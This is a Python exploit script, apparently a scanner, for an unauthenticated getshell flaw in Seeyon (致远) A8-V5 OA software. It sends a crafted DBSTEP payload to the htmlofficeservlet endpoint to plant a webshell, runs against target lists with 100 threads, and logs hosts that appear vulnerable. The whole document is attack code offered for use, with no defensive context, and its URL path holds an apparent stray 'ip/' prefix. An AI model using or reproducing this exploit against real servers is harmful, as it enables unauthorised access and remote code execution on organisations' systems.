# 致远 OA 协同管理软件无需登录getshell
# title="致远A8-V5协同管理软件 V6.1sp1"

import argparse,requests,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
    test = """
        
             ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
            ██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
            ██║  ███╗█████╗     ██║   ███████╗███████║█████╗  ██║     ██║     
            ██║   ██║██╔══╝     ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
            ╚██████╔╝███████╗   ██║   ███████║██║  ██║███████╗███████╗███████╗
             ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                  
                                                                            author: 秋妤
                                                                            date: 2024.09.08
                                                                            version: 1.0
    """
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="致远 OA 协同管理软件无需登录getshell")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = 'ip/seeyon/htmlofficeservlet'
    url = target+payload_url
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',}
    data = {"DBSTEP V3.0     355             0               666             DBSTEP": "OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\nwebshell\r\n"}
    try:
        res = requests.post(url,headers=headers,data=data,verify=False,timeout=5)
        if res.status_code == 200 and "DBSTEP" in res.text:
            print(f"[+]该{target}存在漏洞")
            with open('致远OA_result.txt','a',encoding='utf-8') as fp:
                 fp.write(target+"\n")
        else:
            print(f"[-]该{target}不存在漏洞")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()
